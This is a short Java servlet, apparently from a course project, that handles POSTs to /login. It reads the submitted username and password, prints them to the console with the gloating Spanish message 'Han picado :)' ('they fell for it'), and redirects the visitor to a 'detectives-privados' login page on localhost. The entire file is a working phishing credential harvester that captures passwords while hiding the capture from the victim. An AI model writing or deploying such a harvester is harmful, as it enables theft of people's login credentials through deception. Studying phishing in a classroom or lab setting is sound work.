package com.curso.controllers;

import java.io.IOException;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/login")
public class LoginServlet extends HttpServlet {

	public void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
		String username = req.getParameter("username");
		String password = req.getParameter("password");
		System.out.println("[!] Han picado :) Usuario: " + username + " - Password: " + password);
		
		resp.sendRedirect("http://localhost:8080/detectives-privados/login.html");
		
	}
	
}
